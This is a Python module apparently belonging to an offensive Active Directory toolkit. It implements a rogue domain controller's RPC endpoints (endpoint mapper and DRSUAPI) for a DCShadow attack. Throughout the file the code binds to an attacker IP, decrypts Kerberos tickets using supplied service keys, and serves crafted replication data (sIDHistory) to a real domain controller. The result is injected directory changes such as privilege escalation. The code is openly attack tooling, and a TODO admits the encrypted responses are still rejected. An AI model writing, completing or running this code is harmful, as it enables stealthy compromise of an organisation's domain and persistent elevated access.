"""
DCShadow DCE/RPC server — EPM + DRSUAPI endpoints.

Implements minimal EPM (port 135) and DRSUAPI (port 1337) servers
that handle exactly one replication cycle for DCShadow injection.
"""

import logging
import struct
import socket
import threading
import os
from typing import Optional, Dict

from .kerberos import KerberosUtils

try:
    from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

# DCE/RPC packet types
MSRPC_BIND = 11
MSRPC_BINDACK = 12
MSRPC_REQUEST = 0
MSRPC_RESPONSE = 2
MSRPC_ALTER_CTX = 14
MSRPC_ALTER_CTX_RESP = 15
MSRPC_AUTH3 = 16

# DRSUAPI opnums
DRSUAPI_OPNUM_BIND = 0
DRSUAPI_OPNUM_UNBIND = 1
DRSUAPI_OPNUM_GETNCCHANGES = 3
DRSUAPI_OPNUM_UPDATEREFS = 4

# DRS extension flags
DRS_EXT_BASE                         = 0x00000001
DRS_EXT_RESTORE_USN_OPTIMIZATION     = 0x00000004
DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD = 0x00000008
DRS_EXT_ADDENTRY                     = 0x00000080
DRS_EXT_STRONG_ENCRYPTION            = 0x00008000
DRS_EXT_GETCHGREQ_V8                 = 0x01000000
DRS_EXT_GETCHGREPLY_V6               = 0x04000000

# SPNEGO OIDs
OID_SPNEGO = '1.2.840.113554.1.2.2'  # Kerberos

# Default ports
EPM_PORT = 135
DRSUAPI_PORT = 49666


class DCShadowRPCServer:
    """
    Minimal DCE/RPC server implementing EPM + DRSUAPI for DCShadow.

    Handles exactly one replication cycle:
    1. EPM ept_map -> return DRSUAPI port
    2. DRSUAPI DsBind -> return handle
    3. DRSUAPI DsGetNCChanges -> return crafted replication data
    4. DRSUAPI DsUpdateRefs -> signal completion
    """

    def __init__(self, attacker_ip: str, service_keys: Dict[str, bytes],
                 repl_data: bytes, rogue_dc_guid: bytes,
                 rogue_invocation_id: bytes,
                 drsuapi_port: int = DRSUAPI_PORT):
        self.attacker_ip = attacker_ip
        self.service_keys = service_keys
        self.repl_data = repl_data
        self.rogue_dc_guid = rogue_dc_guid
        self.rogue_invocation_id = rogue_invocation_id
        self.drsuapi_port = drsuapi_port

        self._epm_server = None
        self._drs_server = None
        self._epm_thread = None
        self._drs_thread = None
        self._replication_done = threading.Event()
        self._session_key = None
        self._session_key_etype = None
        self._seq_number = 0
        self._bind_handle = os.urandom(20)

    def start(self):
        """Start EPM and DRSUAPI servers in background threads."""
        self._epm_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._epm_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._epm_server.settimeout(120)
        self._epm_server.bind((self.attacker_ip, EPM_PORT))
        self._epm_server.listen(1)

        self._drs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._drs_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._drs_server.settimeout(120)
        self._drs_server.bind((self.attacker_ip, self.drsuapi_port))
        self._drs_server.listen(1)

        self._epm_thread = threading.Thread(
            target=self._serve_epm, daemon=True, name='DCShadow-EPM'
        )
        self._drs_thread = threading.Thread(
            target=self._serve_drsuapi, daemon=True, name='DCShadow-DRSUAPI'
        )

        self._epm_thread.start()
        self._drs_thread.start()
        logging.debug(f"RPC servers listening (EPM:{EPM_PORT}, DRSUAPI:{self.drsuapi_port})")
        print(f"[*] Listening on {self.attacker_ip}:{EPM_PORT} (EPM) and :{self.drsuapi_port} (DRSUAPI)")

    def wait_for_replication(self, timeout: int = 120) -> bool:
        """Wait for replication to complete."""
        return self._replication_done.wait(timeout=timeout)

    def stop(self):
        """Stop all servers."""
        try:
            if self._epm_server:
                self._epm_server.close()
        except Exception:
            pass
        try:
            if self._drs_server:
                self._drs_server.close()
        except Exception:
            pass

    # -- EPM Server --

    def _serve_epm(self):
        """Handle EPM connections — return DRSUAPI port.

        Loops to handle retries (DC may connect multiple times).
        """
        try:
            while not self._replication_done.is_set():
                try:
                    conn, addr = self._epm_server.accept()
                except socket.timeout:
                    break
                logging.debug(f"[EPM] Connection from {addr}")
                print(f"[*] EPM: Incoming connection from {addr[0]}:{addr[1]}")
                conn.settimeout(30)

                try:
                    data = conn.recv(4096)
                    if data:
                        self._handle_epm_bind_and_map(data, conn)
                except Exception as e:
                    logging.debug(f"EPM handler error: {e}")
                finally:
                    conn.close()
                logging.debug("EPM handler completed")
        except Exception as e:
            logging.debug(f"EPM server error: {e}")

    def _handle_epm_bind_and_map(self, initial_data: bytes, conn: socket.socket):
        """Handle EPM BIND + ept_map request."""
        # First message should be a BIND
        ptype = initial_data[2]  # packet type at offset 2
        logging.debug(f"EPM ptype={ptype}, num_ctx={struct.unpack('<I', initial_data[24:28])[0] if len(initial_data) > 28 else '?'}")

        if ptype == MSRPC_BIND:
            # Build BIND_ACK with no auth (EPM doesn't require auth)
            bind_ack = self._build_epm_bind_ack(initial_data)
            conn.sendall(bind_ack)
            logging.debug(f"EPM BIND_ACK sent ({len(bind_ack)} bytes)")

            # Read the ept_map REQUEST
            data = conn.recv(4096)
            if data and data[2] == MSRPC_REQUEST:
                opnum = struct.unpack('<H', data[22:24])[0]
                logging.debug(f"EPM REQUEST opnum={opnum}")
                response = self._build_epm_map_response(data)
                conn.sendall(response)
                logging.debug(f"EPM ept_map response sent ({len(response)} bytes, port={self.drsuapi_port})")
            elif data:
                logging.debug(f"EPM unexpected ptype={data[2]} after BIND_ACK")
        else:
            logging.debug(f"EPM unexpected initial ptype={ptype}")

    def _build_epm_bind_ack(self, bind_data: bytes) -> bytes:
        """Build a BIND_ACK response for EPM.

        Must return exactly one result per context item in the BIND request.
        Windows DCs send 3 context items (NDR, NDR64, bind-time features) —
        we accept the first (NDR) and reject the rest.
        """
        call_id = struct.unpack('<I', bind_data[12:16])[0]

        # Parse number of context items from BIND body
        # BIND body starts at offset 16; after max_xmit(2)+max_recv(2)+assoc_group(4)
        # we get num_ctx_items at offset 24
        num_ctx = struct.unpack('<I', bind_data[24:28])[0] if len(bind_data) > 28 else 1

        header = struct.pack('<BBBBI', 5, 0, MSRPC_BINDACK, 0x03, 0x10)

        # Secondary address (empty string)
        sec_addr = b'\x00'
        sec_addr_field = struct.pack('<H', 1) + sec_addr
        pad_len = (4 - (len(sec_addr_field) % 4)) % 4
        sec_addr_field += b'\x00' * pad_len

        body = struct.pack('<HHI', 4280, 4280, 1)  # max frag + assoc_group=1
        body += sec_addr_field

        # NDR transfer syntax (for accepted context)
        ndr_syntax = b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'

        # Result list: n_results(1) + reserved(1) + reserved2(2) + results[]
        body += struct.pack('<BBBB', num_ctx, 0, 0, 0)

        for i in range(num_ctx):
            if i == 0:
                # Accept context 0 (NDR 2.0)
                body += struct.pack('<HH', 0, 0)  # acceptance, reason=0
                body += ndr_syntax + struct.pack('<I', 2)  # NDR v2
            else:
                # Reject context (provider_rejection = 2)
                body += struct.pack('<HH', 2, 1)  # provider_rejection, reason=abstract_syntax_not_supported
                body += b'\x00' * 16 + struct.pack('<I', 0)  # empty syntax

        frag_len = 16 + len(body)
        header += struct.pack('<HHI', frag_len, 0, call_id)

        return header + body

    def _build_epm_map_response(self, request_data: bytes) -> bytes:
        """Build ept_map response returning DRSUAPI on our port.

        Uses impacket's own ept_mapResponse NDR class for correct encoding.
        """
        from impacket.dcerpc.v5.epm import (
            ept_mapResponse, twr_p_t, twr_t,
        )

        call_id = struct.unpack('<I', request_data[12:16])[0]

        # Build tower bytes
        tower_bytes = self._build_drsuapi_tower()

        # Build ept_mapResponse using impacket NDR
        resp = ept_mapResponse()
        resp['entry_handle']['context_handle_attributes'] = 0
        resp['entry_handle']['context_handle_uuid'] = b'\x00' * 16
        resp['num_towers'] = 1
        resp['status'] = 0

        tower_entry = twr_t()
        tower_entry['tower_length'] = len(tower_bytes)
        tower_entry['tower_octet_string'] = list(tower_bytes)

        resp['ITowers'].append(twr_p_t())
        resp['ITowers'][0]['Data'] = tower_entry

        # CRITICAL: Windows DC ignores the EPM response unless the NDR
        # conformant array MaximumCount >= 4. This is an empirically
        # discovered quirk — see ShutdownRepo/dcshadow.
        try:
            resp.fields['ITowers'].fields['MaximumCount'] = 4
        except Exception:
            pass

        resp_body = resp.getData()

        # Fallback: if impacket's NDR didn't honor the MaximumCount override,
        # patch it directly in the binary. MaximumCount is at offset 24
        # (20 bytes entry_handle + 4 bytes num_towers) in the NDR body.
        mc_offset = 24
        current_mc = struct.unpack('<I', resp_body[mc_offset:mc_offset+4])[0]
        if current_mc < 4:
            resp_body = (resp_body[:mc_offset] +
                         struct.pack('<I', 4) +
                         resp_body[mc_offset+4:])

        # Build RESPONSE header
        alloc_hint = len(resp_body)
        header = struct.pack('<BBBBI', 5, 0, MSRPC_RESPONSE, 0x03, 0x10)
        frag_len = 24 + len(resp_body)
        header += struct.pack('<HHI', frag_len, 0, call_id)
        header += struct.pack('<IHH', alloc_hint, 0, 0)

        return header + resp_body

    def _build_drsuapi_tower(self) -> bytes:
        """Build EPM tower bytes for DRSUAPI over ncacn_ip_tcp.

        Uses impacket's own EPM structures to ensure correct encoding.
        """
        from impacket.dcerpc.v5 import epm as _epm, drsuapi as _drsuapi
        from impacket.dcerpc.v5.epm import (
            EPMTower, EPMRPCInterface, EPMRPCDataRepresentation,
            EPMProtocolIdentifier, EPMPortAddr, EPMHostAddr,
            FLOOR_RPCV5_IDENTIFIER,
        )
        from struct import unpack as _unpack

        # NDR transfer syntax UUID (same as used by impacket's hept_map)
        ndr_transfer = b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00'

        # Floor 1: DRSUAPI interface
        interface = EPMRPCInterface()
        interface['InterfaceUUID'] = _drsuapi.MSRPC_UUID_DRSUAPI[:16]
        interface['MajorVersion'] = _unpack('<H', _drsuapi.MSRPC_UUID_DRSUAPI[16:18])[0]
        interface['MinorVersion'] = _unpack('<H', _drsuapi.MSRPC_UUID_DRSUAPI[18:20])[0]

        # Floor 2: NDR data representation
        dataRep = EPMRPCDataRepresentation()
        dataRep['DataRepUuid'] = ndr_transfer[:16]
        dataRep['MajorVersion'] = _unpack('<H', ndr_transfer[16:18])[0]
        dataRep['MinorVersion'] = _unpack('<H', ndr_transfer[18:20])[0]

        # Floor 3: RPC connection-oriented protocol (ncacn)
        protId = EPMProtocolIdentifier()
        protId['ProtIdentifier'] = FLOOR_RPCV5_IDENTIFIER

        # Floor 4: TCP port
        portAddr = EPMPortAddr()
        portAddr['IpPort'] = self.drsuapi_port

        # Floor 5: IP address
        hostAddr = EPMHostAddr()
        hostAddr['Ip4addr'] = socket.inet_aton(self.attacker_ip)

        tower = EPMTower()
        tower['NumberOfFloors'] = 5
        tower['Floors'] = (interface.getData() + dataRep.getData() +
                           protId.getData() + portAddr.getData() +
                           hostAddr.getData())

        return tower.getData()

    # -- DRSUAPI Server --

    def _serve_drsuapi(self):
        """Handle DRSUAPI connection — full replication cycle."""
        try:
            conn, addr = self._drs_server.accept()
            logging.debug(f"[DRSUAPI] Connection from {addr}")
            print(f"[*] DRSUAPI: Incoming connection from {addr[0]}:{addr[1]}")
            conn.settimeout(60)

            while True:
                data = self._recv_full_pdu(conn)
                if not data:
                    logging.debug("DRSUAPI: connection closed by peer")
                    break

                ptype = data[2]
                logging.debug(f"DRSUAPI: received ptype={ptype}, len={len(data)}")

                if ptype == MSRPC_BIND:
                    response = self._handle_drs_bind(data)
                    conn.sendall(response)
                    logging.debug(f"DRSUAPI: BIND_ACK sent ({len(response)} bytes)")

                elif ptype == MSRPC_AUTH3:
                    # AUTH3 completes multi-leg auth — no response needed
                    logging.debug("Received AUTH3 (auth completion)")

                elif ptype == MSRPC_ALTER_CTX:
                    response = self._handle_alter_ctx(data)
                    conn.sendall(response)
                    logging.debug(f"DRSUAPI: ALTER_CTX_RESP sent ({len(response)} bytes)")

                elif ptype == MSRPC_REQUEST:
                    response = self._handle_drs_request(data)
                    if response:
                        conn.sendall(response)

                    # Check if replication is done
                    if self._replication_done.is_set():
                        break

            conn.close()
            logging.debug("DRSUAPI handler completed")

        except socket.timeout:
            logging.debug("DRSUAPI server timeout")
        except Exception as e:
            logging.debug(f"DRSUAPI server error: {e}")
            import traceback
            traceback.print_exc()

    def _recv_full_pdu(self, conn: socket.socket) -> Optional[bytes]:
        """Receive a complete DCE/RPC PDU."""
        try:
            # Read header (at least 16 bytes)
            header = b''
            while len(header) < 16:
                chunk = conn.recv(16 - len(header))
                if not chunk:
                    return None
                header += chunk

            # Get fragment length
            frag_len = struct.unpack('<H', header[8:10])[0]

            # Read remaining
            data = header
            while len(data) < frag_len:
                chunk = conn.recv(frag_len - len(data))
                if not chunk:
                    return None
                data += chunk

            return data

        except Exception:
            return None

    def _handle_drs_bind(self, data: bytes) -> bytes:
        """Handle DRSUAPI BIND with Kerberos authentication."""
        call_id = struct.unpack('<I', data[12:16])[0]
        auth_len = struct.unpack('<H', data[10:12])[0]

        # Extract auth data (SPNEGO wrapping Kerberos AP-REQ)
        if auth_len > 0:
            auth_trailer_start = len(data) - auth_len - 8  # 8 = SEC_TRAILER size
            auth_type = data[auth_trailer_start]
            auth_level = data[auth_trailer_start + 1]
            auth_data = data[auth_trailer_start + 8:]

            logging.debug(f"BIND auth_type={auth_type}, auth_level={auth_level}")

            # Store auth params for use in responses
            self._auth_type = auth_type
            self._auth_level = auth_level

            try:
                # Extract AP-REQ from auth data
                # Works for both SPNEGO (auth_type=9) and raw Kerberos (auth_type=16)
                ap_req_bytes = self._extract_ap_req_from_spnego(auth_data)

                # Decrypt AP-REQ — returns both ticket session key and GSS subkey
                ticket_key, ticket_etype, \
                    self._session_key, self._session_key_etype, \
                    self._seq_number, client_ctime, client_cusec = \
                    KerberosUtils.decrypt_ap_req(ap_req_bytes, self.service_keys)

                # Store ticket key for fallback (in case subkey extraction is wrong)
                self._ticket_key = ticket_key
                self._ticket_key_etype = ticket_etype

                logging.debug(f"Kerberos auth successful (ticket_etype={ticket_etype}, "
                              f"gss_etype={self._session_key_etype})")

                # Build AP-REP — encrypted with TICKET session key (not subkey)
                ap_rep = KerberosUtils.build_ap_rep(
                    ticket_key, ticket_etype, self._seq_number,
                    ctime=client_ctime, cusec=client_cusec
                )

                # Wrap in SPNEGO only if client used SPNEGO
                if auth_type == 9:
                    resp_token = self._build_spnego_response(ap_rep)
                else:
                    resp_token = ap_rep

            except Exception as e:
                logging.error(f"Kerberos auth failed: {e}")
                import traceback; traceback.print_exc()
                resp_token = b''
        else:
            self._auth_type = 9
            self._auth_level = 6
            resp_token = b''

        # Build BIND_ACK
        return self._build_drs_bind_ack(call_id, resp_token, auth_len > 0, data)

    def _extract_ap_req_from_spnego(self, auth_data: bytes) -> bytes:
        """Extract Kerberos AP-REQ from SPNEGO negTokenInit."""
        try:
            # Try parsing as SPNEGO
            spnego = SPNEGO_NegTokenInit(auth_data)
            mech_tokens = spnego['MechToken']
            if mech_tokens:
                # The mechToken contains the raw AP-REQ
                return bytes(mech_tokens)
        except Exception:
            pass

        # Try raw AP-REQ (no SPNEGO wrapper)
        if auth_data[0] == 0x60:
            # GSS-API OID wrapper
            # Skip the OID prefix to get to the AP-REQ
            idx = 0
            if auth_data[idx] == 0x60:
                idx += 1
                # Length
                if auth_data[idx] & 0x80:
                    num_len_bytes = auth_data[idx] & 0x7f
                    idx += 1 + num_len_bytes
                else:
                    idx += 1
                # OID
                if auth_data[idx] == 0x06:
                    oid_len = auth_data[idx + 1]
                    idx += 2 + oid_len
            return auth_data[idx:]

        return auth_data

    def _build_spnego_response(self, ap_rep: bytes) -> bytes:
        """Build SPNEGO negTokenResp with AP-REP."""
        resp = SPNEGO_NegTokenResp()
        resp['NegState'] = b'\x00'  # accept-completed
        resp['ResponseToken'] = ap_rep
        # SupportedMech is optional in negTokenResp and omitted here
        return resp.getData()

    def _build_drs_bind_ack(self, call_id: int, auth_token: bytes,
                            has_auth: bool, bind_data: bytes = b'') -> bytes:
        """Build BIND_ACK response for DRSUAPI.

        Parses num_ctx_items from the BIND request and returns one result
        per context item (accept first/NDR, reject rest).
        """
        # Parse number of context items from BIND
        num_ctx = 1
        if len(bind_data) > 28:
            num_ctx = struct.unpack('<I', bind_data[24:28])[0]

        # BIND_ACK body
        body = struct.pack('<HHI', 4280, 4280, 1)  # max frag + assoc group

        # Secondary address (empty)
        body += struct.pack('<H', 1) + b'\x00'
        # Pad to 4-byte boundary
        body += b'\x00'

        # NDR transfer syntax (wire format)
        ndr_syntax = b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'

        # Result list: one result per context item
        body += struct.pack('<BBBB', num_ctx, 0, 0, 0)

        for i in range(num_ctx):
            if i == 0:
                # Accept context 0 (NDR 2.0)
                body += struct.pack('<HH', 0, 0)  # accept
                body += ndr_syntax + struct.pack('<I', 2)
            else:
                # Reject others (provider_rejection)
                body += struct.pack('<HH', 2, 1)
                body += b'\x00' * 16 + struct.pack('<I', 0)

        # Auth trailer
        auth_trailer = b''
        if has_auth and auth_token:
            # Pad body to 4-byte alignment
            pad = (4 - (len(body) % 4)) % 4
            body += b'\x00' * pad

            # SEC_TRAILER: auth_type(1) + auth_level(1) + pad_length(1) +
            #              reserved(1) + context_id(4)
            # Echo back the same auth_type the client used in the BIND
            at = getattr(self, '_auth_type', 9)
            al = getattr(self, '_auth_level', 6)
            auth_trailer = struct.pack('<BBBBI', at, al, pad, 0, 0)
            auth_trailer += auth_token

        # DCE/RPC header
        auth_len = len(auth_token) if auth_token else 0
        frag_len = 16 + len(body) + len(auth_trailer)

        header = struct.pack('<BBBBI', 5, 0, MSRPC_BINDACK, 0x03, 0x10)
        header += struct.pack('<HHI', frag_len, auth_len, call_id)

        return header + body + auth_trailer

    def _handle_alter_ctx(self, data: bytes) -> bytes:
        """Handle ALTER_CONTEXT — same as BIND_ACK but type 15.

        Auth data is stripped (empirically discovered — DC expects no auth
        in ALTER_CTX_RESP even when the session is authenticated).
        """
        call_id = struct.unpack('<I', data[12:16])[0]
        # Reuse bind_ack logic with NO auth (strip auth data)
        ack = self._build_drs_bind_ack(call_id, b'', False, data)
        # Change type to ALTER_CTX_RESP
        ack = ack[:2] + bytes([MSRPC_ALTER_CTX_RESP]) + ack[3:]
        return ack

    def _handle_drs_request(self, data: bytes) -> Optional[bytes]:
        """Handle DRSUAPI REQUEST — dispatch by opnum."""
        call_id = struct.unpack('<I', data[12:16])[0]
        auth_len = struct.unpack('<H', data[10:12])[0]

        # Extract ctx_id and opnum from request header
        ctx_id = struct.unpack('<H', data[20:22])[0]
        opnum = struct.unpack('<H', data[22:24])[0]
        self._last_ctx_id = ctx_id  # Save for response

        logging.debug(f"REQUEST PDU: ctx_id={ctx_id}, opnum={opnum}, "
                      f"auth_len={auth_len}, total={len(data)}")
        logging.debug(f"REQUEST header hex: {data[:24].hex()}")

        # Extract and decrypt stub data if authenticated
        stub_data = self._extract_stub_data(data, auth_len)

        logging.debug(f"DRSUAPI request opnum={opnum}")

        if opnum == DRSUAPI_OPNUM_BIND:
            resp_stub = self._handle_opnum_bind(stub_data)
        elif opnum == DRSUAPI_OPNUM_GETNCCHANGES:
            resp_stub = self._handle_opnum_getncchanges(stub_data)
        elif opnum == DRSUAPI_OPNUM_UPDATEREFS:
            resp_stub = self._handle_opnum_updaterefs(stub_data)
            self._replication_done.set()
        elif opnum == DRSUAPI_OPNUM_UNBIND:
            resp_stub = self._handle_opnum_unbind(stub_data)
        else:
            logging.debug(f"Unknown opnum {opnum}, ignoring")
            return None

        return self._build_response(call_id, opnum, resp_stub, auth_len > 0)

    def _extract_stub_data(self, data: bytes, auth_len: int) -> bytes:
        """Extract (and optionally decrypt) the stub data from a REQUEST.

        Server-side unwrap of client data using correct Kerberos key usage.
        """
        from impacket.krb5.gssapi import (
            GSSAPI_AES256, GSSAPI_AES128,
            KG_USAGE_INITIATOR_SEAL, KG_USAGE_ACCEPTOR_SEAL,
        )
        from impacket.krb5.crypto import Key, _enctype_table
        from impacket.dcerpc.v5.rpcrt import SEC_TRAILER

        header_len = 24
        if auth_len == 0:
            return data[header_len:]

        # Parse SEC_TRAILER position
        auth_trailer_start = len(data) - auth_len - 8
        sec_trailer_bytes = data[auth_trailer_start:auth_trailer_start + 8]
        pad_len = sec_trailer_bytes[2]
        auth_value = data[auth_trailer_start + 8:]
        encrypted_stub = data[header_len:auth_trailer_start]

        logging.debug(f"PDU layout: header=24, stub={len(encrypted_stub)}, "
                      f"sec_trailer=8, auth_value={len(auth_value)}, "
                      f"pad_len={pad_len}, auth_len={auth_len}")
        logging.debug(f"auth_value hex: {auth_value[:48].hex()}")
        logging.debug(f"encrypted_stub hex (first 32): {encrypted_stub[:32].hex()}")

        if not self._session_key:
            return data[header_len:]

        # Try multiple key/usage combinations
        keys_to_try = []

        # Primary: GSS subkey (from Authenticator) with INITIATOR_SEAL
        keys_to_try.append((
            'subkey+INITIATOR_SEAL',
            self._session_key, self._session_key_etype,
            KG_USAGE_INITIATOR_SEAL
        ))

        # Fallback 1: ticket session key with INITIATOR_SEAL
        ticket_key = getattr(self, '_ticket_key', None)
        ticket_etype = getattr(self, '_ticket_key_etype', None)
        if ticket_key and ticket_key != self._session_key:
            keys_to_try.append((
                'ticket_key+INITIATOR_SEAL',
                ticket_key, ticket_etype,
                KG_USAGE_INITIATOR_SEAL
            ))

        # Fallback 2: subkey with ACCEPTOR_SEAL (in case convention is inverted)
        keys_to_try.append((
            'subkey+ACCEPTOR_SEAL',
            self._session_key, self._session_key_etype,
            KG_USAGE_ACCEPTOR_SEAL
        ))

        # Fallback 3: ticket key with ACCEPTOR_SEAL
        if ticket_key and ticket_key != self._session_key:
            keys_to_try.append((
                'ticket_key+ACCEPTOR_SEAL',
                ticket_key, ticket_etype,
                KG_USAGE_ACCEPTOR_SEAL
            ))

        for label, key_bytes, etype, key_usage in keys_to_try:
            if etype not in (17, 18):
                continue  # handle RC4 separately

            try:
                key = Key(etype, key_bytes)
                cipher = _enctype_table[etype]
                gss_cls = GSSAPI_AES256 if etype == 18 else GSSAPI_AES128
                gss = gss_cls()

                # Parse WRAP token from auth_value
                token = gss.WRAP(auth_value)
                tok_id = token['TOK_ID']
                flags = token['Flags']
                ec = token['EC']
                rrc = token['RRC']

                logging.debug(f"[{label}] WRAP: TOK_ID=0x{tok_id:04x}, "
                              f"Flags=0x{flags:02x}, EC={ec}, RRC={rrc}, "
                              f"key={key_bytes[:8].hex()}..., etype={etype}, ku={key_usage}")

                # Reconstruct rotated ciphertext
                wrap_hdr_len = 16  # Fixed size of WRAP header
                rotated = auth_value[wrap_hdr_len:] + encrypted_stub
                logging.debug(f"[{label}] rotated len={len(rotated)}")

                cipherText = gss.unrotate(rotated, rrc + ec)
                logging.debug(f"[{label}] unrotated ciphertext len={len(cipherText)}, "
                              f"first 16: {cipherText[:16].hex()}")

                plainText = cipher.decrypt(key, key_usage, cipherText)

                # Strip EC padding + WRAP header that was appended before encryption
                result = plainText[:-(ec + wrap_hdr_len)]
                logging.debug(f"[{label}] SUCCESS! plaintext len={len(result)}")

                # Strip DCE/RPC padding if present
                if pad_len > 0:
                    result = result[:-pad_len]

                return result

            except Exception as e:
                logging.debug(f"[{label}] FAILED: {e}")
                continue

        # All attempts failed — try RC4 as last resort
        if self._session_key_etype == 23:
            try:
                from impacket.krb5.gssapi import GSSAPI_RC4
                key = Key(23, self._session_key)
                gss = GSSAPI_RC4()
                full_auth = sec_trailer_bytes + auth_value
                plaintext, _ = gss.GSS_Unwrap(
                    key, encrypted_stub, self._seq_number,
                    direction='accept', encrypt=True,
                    authData=full_auth
                )
                return plaintext
            except Exception as e:
                logging.debug(f"RC4 unwrap failed: {e}")

        logging.error("All GSS unwrap attempts failed, returning raw stub")
        return data[header_len:auth_trailer_start]

    def _handle_opnum_bind(self, stub_data: bytes) -> bytes:
        """Handle DsBind (opnum 0) — return handle + extensions."""
        # Build DRS_EXTENSIONS_INT
        ext_flags = (
            DRS_EXT_BASE |
            DRS_EXT_RESTORE_USN_OPTIMIZATION |
            DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD |
            DRS_EXT_STRONG_ENCRYPTION |
            DRS_EXT_GETCHGREQ_V8
        )

        # DRS_EXTENSIONS_INT: cb(4) + dwFlags(4) + SiteObjGuid(16) + Pid(4) +
        #                     dwReplEpoch(4) + dwFlagsExt(4) + ConfigObjGUID(16) + dwExtCaps(4)
        ext_data = struct.pack('<II', 48, ext_flags)
        ext_data += b'\x00' * 16  # SiteObjGuid
        ext_data += struct.pack('<I', 0)  # Pid
        ext_data += struct.pack('<I', 0)  # dwReplEpoch
        ext_data += struct.pack('<I', 0)  # dwFlagsExt
        ext_data += b'\x00' * 16  # ConfigObjGUID
        ext_data += struct.pack('<I', 0xFFFFFFFF)  # dwExtCaps

        # Response: ppextServer (NDR pointer + data) + phDrs (handle)
        # NDR: referent_id(4) + cb(4) + data...
        resp = struct.pack('<I', 1)  # referent id
        resp += struct.pack('<I', len(ext_data))  # cb
        resp += struct.pack('<I', len(ext_data))  # NDR conformant max
        resp += ext_data
        resp += self._bind_handle  # phDrs (20 bytes)
        resp += struct.pack('<I', 0)  # return value (success)

        return resp

    def _handle_opnum_getncchanges(self, stub_data: bytes) -> bytes:
        """Handle DsGetNCChanges (opnum 3) — return our replication data."""
        logging.debug("Serving DsGetNCChanges with crafted sIDHistory data")
        # Return pre-built replication response
        return self.repl_data

    def _handle_opnum_updaterefs(self, stub_data: bytes) -> bytes:
        """Handle DsUpdateRefs (opnum 4) — acknowledge."""
        logging.debug("DsUpdateRefs received — replication complete")
        return struct.pack('<I', 0)  # success

    def _handle_opnum_unbind(self, stub_data: bytes) -> bytes:
        """Handle DsUnbind (opnum 1)."""
        return b'\x00' * 20 + struct.pack('<I', 0)  # handle + success

    def _build_response(self, call_id: int, opnum: int, stub_data: bytes,
                        has_auth: bool) -> bytes:
        """Build a DCE/RPC RESPONSE PDU.

        Server-side GSS wrap using KG_USAGE_ACCEPTOR_SEAL (22).
        impacket's GSS_Wrap hardcodes KG_USAGE_INITIATOR_SEAL (24),
        which is wrong for server→client direction.
        """
        from impacket.krb5.gssapi import (
            GSSAPI_AES256, GSSAPI_AES128,
            KG_USAGE_ACCEPTOR_SEAL, KG_USAGE_INITIATOR_SEAL,
        )
        from impacket.krb5.crypto import Key, _enctype_table

        auth_trailer = b''
        auth_len = 0

        if has_auth and self._session_key:
            try:
                self._seq_number += 1

                # Pad stub to 4-byte alignment before encryption
                pad = (4 - (len(stub_data) % 4)) % 4
                padded_stub = stub_data + b'\xBB' * pad

                key = Key(self._session_key_etype, self._session_key)
                cipher = _enctype_table[self._session_key_etype]

                if self._session_key_etype in (17, 18):
                    # Server-side wrap: KG_USAGE_ACCEPTOR_SEAL per RFC 4121
                    # TODO: Windows DC still rejects this. Need to investigate
                    # whether AP-REP subkey or different key derivation is needed.
                    ku = KG_USAGE_ACCEPTOR_SEAL
                    flags = 0x01 | 0x02  # SentByAcceptor + Sealed
                    label = 'ACCEPTOR_SEAL'

                    gss_cls = GSSAPI_AES256 if self._session_key_etype == 18 else GSSAPI_AES128
                    gss = gss_cls()

                    token = gss.WRAP()
                    token['Flags'] = flags
                    token['EC'] = (cipher.blocksize - (len(padded_stub) % cipher.blocksize)) & 15
                    token['RRC'] = 0  # Must be 0 for encryption input
                    token['SND_SEQ'] = struct.pack('>Q', self._seq_number)

                    # Pad data to AES block size
                    ec_pad = b'\xFF' * token['EC']
                    data_to_encrypt = padded_stub + ec_pad + token.getData()

                    cipherText = cipher.encrypt(key, ku, data_to_encrypt, None)

                    # Rotate by RRC + EC (RRC=28 for AES)
                    rrc = 28
                    token['RRC'] = rrc
                    cipherText = gss.rotate(cipherText, rrc + token['EC'])

                    # Split: encrypted_stub goes in PDU body, auth_value in trailer
                    wrap_hdr_len = 16
                    split_at = wrap_hdr_len + rrc + token['EC']
                    encrypted_stub = cipherText[split_at:]
                    auth_value = token.getData() + cipherText[:split_at]

                    stub_data = encrypted_stub
                    auth_len = len(auth_value)

                    logging.debug(f"GSS wrap [{label}]: stub={len(stub_data)}, "
                                  f"auth={auth_len}, EC={token['EC']}, "
                                  f"Flags=0x{flags:02x}, ku={ku}, seq={self._seq_number}")
                else:
                    raise ValueError(f"Unsupported etype for wrap: {self._session_key_etype}")

                # SEC_TRAILER + auth_value
                at = getattr(self, '_auth_type', 9)
                al = getattr(self, '_auth_level', 6)
                auth_trailer = struct.pack('<BBBBI', at, al, pad, 0, 0)
                auth_trailer += auth_value
                auth_len = len(auth_value)
            except Exception as e:
                logging.debug(f"GSS wrap failed, sending unencrypted: {e}")
                import traceback; traceback.print_exc()

        # Header — echo ctx_id from request
        ctx_id = getattr(self, '_last_ctx_id', 0)
        header = struct.pack('<BBBBI', 5, 0, MSRPC_RESPONSE, 0x03, 0x10)
        frag_len = 24 + len(stub_data) + len(auth_trailer)
        header += struct.pack('<HHI', frag_len, auth_len, call_id)
        header += struct.pack('<IH', len(stub_data), ctx_id)
        header += struct.pack('<BB', 0, 0)  # cancel_count, padding

        result = header + stub_data + auth_trailer

        logging.debug(f"RESPONSE PDU: frag_len={frag_len}, auth_len={auth_len}, "
                      f"ctx_id={ctx_id}, alloc_hint={len(stub_data)}")
        logging.debug(f"RESPONSE header hex: {header.hex()}")
        logging.debug(f"RESPONSE SEC_TRAILER hex: {auth_trailer[:8].hex()}")
        if len(auth_trailer) > 8:
            logging.debug(f"RESPONSE auth_value hex (first 48): {auth_trailer[8:56].hex()}")

        return result
